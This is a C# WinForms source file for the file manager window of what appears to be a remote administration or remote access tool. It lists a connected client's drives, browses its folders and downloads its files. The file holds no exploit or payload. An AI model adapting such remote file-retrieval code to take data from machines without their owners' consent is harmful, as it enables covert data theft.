using Serveur.Controllers.Server;
using Serveur.Models;
using Serveur.Packets.ServerPackets;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmFileManager : Form
    {
        private readonly ClientMosaique _client;
        private const int TRANSFER_STATUS = 2;
        private const int TRANSFER_TYPE = 1;
        private const int TRANSFER_ID = 0;

        public FrmFileManager(ClientMosaique client)
        {
            _client = client;
            _client.value.frmFm = this;
            InitializeComponent();
            ListViewItem lvi = new ListViewItem(new string[] { "", "", "", "" });
            lvTransfers.Items.Add(lvi);
        }

        private void FrmFileManager_Load(object sender, EventArgs e)
        {
            new GetDrives().Execute(_client);
        }

        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_client.value != null)
            {
                foreach (ListViewItem transfer in lvTransfers.Items)
                {
                    if (!transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Downloading") &&
                        !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Uploading") &&
                        !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Pending")) continue;

                    int id = int.Parse(transfer.SubItems[TRANSFER_ID].Text);

                    if (transfer.SubItems[TRANSFER_TYPE].Text == "Download")
                    {
                        if (_client != null)
                            new DoDownloadFileCancel(id).Execute(_client);
                        if (!Serveur.Controllers.FrmFileManagerController.canceledDownloads.ContainsKey(id))
                            Serveur.Controllers.FrmFileManagerController.canceledDownloads.Add(id, "canceled");
                        if (Serveur.Controllers.FrmFileManagerController.renamedFiles.ContainsKey(id))
                            Serveur.Controllers.FrmFileManagerController.renamedFiles.Remove(id);
                        updateTransferStatus(transfer.Index, "Canceled", 0);
                    }
                    else if (transfer.SubItems[TRANSFER_TYPE].Text == "Upload")
                    {
                        //if (!CanceledUploads.ContainsKey(id))
                        //    CanceledUploads.Add(id, "canceled");
                        //UpdateTransferStatus(transfer.Index, "Canceled", 0);
                    }
                }
                _client.value.frmFm = null;
            }
        }

        //BUTTONS
        private void cancelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lvTransfers.SelectedItems)
            {
                if (!transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Downloading") &&
                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Uploading") &&
                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Pending")) continue;

                int id = int.Parse(transfer.SubItems[TRANSFER_ID].Text);

                if (transfer.SubItems[TRANSFER_TYPE].Text == "Download")
                {
                    if (_client != null)
                        new DoDownloadFileCancel(id).Execute(_client);
                    if (!Serveur.Controllers.FrmFileManagerController.canceledDownloads.ContainsKey(id))
                        Serveur.Controllers.FrmFileManagerController.canceledDownloads.Add(id, "canceled");
                    if (Serveur.Controllers.FrmFileManagerController.renamedFiles.ContainsKey(id))
                        Serveur.Controllers.FrmFileManagerController.renamedFiles.Remove(id);
                    updateTransferStatus(transfer.Index, "Canceled", 0);
                }
                else if (transfer.SubItems[TRANSFER_TYPE].Text == "Upload")
                {
                    //if (!CanceledUploads.ContainsKey(id))
                    //    CanceledUploads.Add(id, "canceled");
                    //UpdateTransferStatus(transfer.Index, "Canceled", 0);
                }
            }
        }

        private void lvDirectory_DoubleClick(object sender, EventArgs e)
        {
            if (_client != null && _client.value != null && lvDirectory.SelectedItems.Count > 0)
            {
                Serveur.Controllers.FrmFileManagerController.PathType type = (Serveur.Controllers.FrmFileManagerController.PathType)lvDirectory.SelectedItems[0].Tag;

                switch (type)
                {
                    case Serveur.Controllers.FrmFileManagerController.PathType.Back:
                        Serveur.Controllers.FrmFileManagerController.navigateUp(_client);
                        Serveur.Controllers.FrmFileManagerController.refreshDirectory(_client);
                        break;
                    case Serveur.Controllers.FrmFileManagerController.PathType.Directory:
                        setCurrentDir(Serveur.Controllers.FrmFileManagerController.getAbsolutePath(lvDirectory.SelectedItems[0].SubItems[0].Text));
                        Serveur.Controllers.FrmFileManagerController.refreshDirectory(_client);
                        break;
                }
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lvDirectory.SelectedItems)
            {
                Serveur.Controllers.FrmFileManagerController.PathType type = (Serveur.Controllers.FrmFileManagerController.PathType)files.Tag;

                if (type == Serveur.Controllers.FrmFileManagerController.PathType.File)
                {
                    string path = Serveur.Controllers.FrmFileManagerController.getAbsolutePath(files.SubItems[0].Text);

                    int uniqId = Serveur.Controllers.FrmFileManagerController.getNewTransferId(files.Index);

                    if (_client != null)
                    {
                        new DoDownloadFile(path, uniqId).Execute(_client);

                        addTransfer(uniqId, "Download", "Pending...", files.SubItems[0].Text);
                    }
                }
            }
        }

        //EVENT
        private void cboDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (_client != null && _client.value != null)
            {
                setCurrentDir(cboDrives.SelectedValue.ToString());
                Serveur.Controllers.FrmFileManagerController.refreshDirectory(_client);
            }
        }

        //CALLBACK
        public void addDrives(RemoteDrive[] drives)
        {
            try
            {
                cboDrives.Invoke((MethodInvoker)delegate
                {
                    cboDrives.DisplayMember = "DisplayName";
                    cboDrives.ValueMember = "RootDirectory";
                    cboDrives.DataSource = new BindingSource(drives, null);
                });
            }
            catch (InvalidOperationException)
            {

            }
        }

        public void setStatus(string text, bool setLastDirectorySeen = false)
        {
            try
            {
                if (_client.value != null && setLastDirectorySeen)
                {
                    setCurrentDir(Path.GetFullPath(Path.Combine(Serveur.Controllers.FrmFileManagerController._currentDir, @"..\")));
                    _client.value.receivedLastDirectory = true;
                }
                statusStrip.Invoke((MethodInvoker)delegate
                {
                    stripLblStatus.Text = "Status: " + text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void setCurrentDir(string path)
        {
            Serveur.Controllers.FrmFileManagerController._currentDir = path;
            try
            {
                txtPath.Invoke((MethodInvoker)delegate
                {
                    txtPath.Text = Serveur.Controllers.FrmFileManagerController._currentDir;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void clearFileBrowser()
        {
            try
            {
                lvDirectory.Invoke((MethodInvoker)delegate
                {
                    lvDirectory.Items.Clear();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void addItemToFileBrowser(string name, string size, Serveur.Controllers.FrmFileManagerController.PathType type, int imageIndex)
        {
            try
            {
                ListViewItem lvi = new ListViewItem(new string[] { name, size, (type != Serveur.Controllers.FrmFileManagerController.PathType.Back) ? type.ToString() : string.Empty })
                {
                    Tag = type,
                    ImageIndex = imageIndex
                };

                lvDirectory.Invoke((MethodInvoker)delegate
                {
                    lvDirectory.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void addTransfer(int uniqId, string type, string status, string filename)
        {
            try
            {
                ListViewItem lvi =
                  new ListViewItem(new string[] {uniqId.ToString(), type, status, filename });

                lvDirectory.Invoke((MethodInvoker)delegate
                {
                    lvTransfers.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void updateTransferStatus(int index, string status, int imageIndex)
        {
            try
            {
                lvTransfers.Invoke((MethodInvoker)delegate
                {
                    lvTransfers.Invoke((MethodInvoker)delegate
                    {
                        lvTransfers.Items[index].SubItems[TRANSFER_STATUS].Text = status;
                    });

                });
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception)
            {
            }
        }

        public int getTransferIndex(int id)
        {
            string strId = id.ToString();
            int index = 0;

            try
            {
                lvTransfers.Invoke((MethodInvoker)delegate
                {
                    foreach (ListViewItem lvi in lvTransfers.Items.Cast<ListViewItem>().Where(lvi => lvi != null && strId.Equals(lvi.SubItems[TRANSFER_ID].Text)))
                    {
                        index = lvi.Index;
                        break;
                    }
                });
            }
            catch (InvalidOperationException)
            {
                return -1;
            }

            return index;
        }

        private void btnDwnldFolder_Click(object sender, EventArgs e)
        {
            if(_client.value != null && _client.value.downloadDirectory != null)
            {
                Process.Start(@_client.value.downloadDirectory);
            }
        }
    }
}
